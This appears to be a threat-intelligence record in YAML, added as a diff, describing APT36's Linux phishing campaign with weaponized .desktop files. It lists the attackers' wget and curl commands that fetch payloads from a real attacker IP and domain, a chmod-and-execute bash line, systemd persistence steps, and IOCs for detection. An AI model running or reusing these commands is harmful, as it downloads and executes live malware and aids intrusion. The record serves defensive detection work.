@@ -1,0 +1,56 @@
+description: "APT36 (Transparent Tribe) executed a Linux\u2011targeted phishing campaign\
+  \ using weaponized .desktop files that staged ELF and shell payloads, establishing\
+  \ persistence via systemd services."
+attribution: APT36 / Transparent Tribe
+TTPs:
+  processes:
+  - swcbc
+  - swcbc.sh
+  - Analysis_Proc_Report_Gem.desktop
+  commandline:
+  - '''/tmp/swcbc'' executed after chmod +x'
+  - '''/tmp/swcbc.sh'' executed after chmod +x'
+  - libreoffice '/tmp/Analysis_Proc_Report_Gem.pdf'
+  - curl -o /tmp/Analysis_Proc_Report_Gem.pdf 'http://lionsdenim.xyz/in/Analysis_Proc_Report_Gem.pdf'
+  - wget -O /tmp/swcbc 'http://185.235.137.90:32587/uploads/yash10_52228826567/swcbc'
+  - wget -O /tmp/swcbc.sh 'http://185.235.137.90:32587/uploads/yash10_52228826567/swcbc.sh'
+  powershell: []
+  scripting_engine:
+  - '# Bash script to download and execute payloads'
+  - cd /tmp && chmod +x swcbc swcbc.sh && ./swcbc & ./swcbc.sh & libreoffice /tmp/Analysis_Proc_Report_Gem.pdf
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: wget
+    destination: 185.235.137.90
+    port: 32587
+  - process: curl
+    destination: lionsdenim.xyz
+    port: 80
+  - process: libreoffice
+    destination: localhost
+    port: null
+  file_activity:
+  - /tmp/Analysis_Proc_Report_Gem.pdf
+  - /tmp/swcbc
+  - /tmp/swcbc.sh
+  - ~/.swcbc/
+  persistence:
+  - Create systemd user service in ~/.config/systemd/user/
+  - Enable and start the service to run swcbc at login
+  process_relations: []
+IOCs:
+  hashes:
+  - e9ab3246d4ab6cef550f7ea1d9f938e1
+  - 17992c80e99d268ec7d759d3df3cbfad
+  - b6f446418235507fda4abf91ee556a1d
+  - 0fed60850aa38127095f21182cc2c85d
+  ip_addresses:
+  - 185.235.137.90
+  domains:
+  - lionsdenim.xyz
+authors:
+- CYFIRMA
+reference: https://www.cyfirma.com/research/apt36-python-based-elf-malware-targeting-indian-government-entities
+date_of_publication: November 29, 2025
+file_creation_date: December 01, 2025
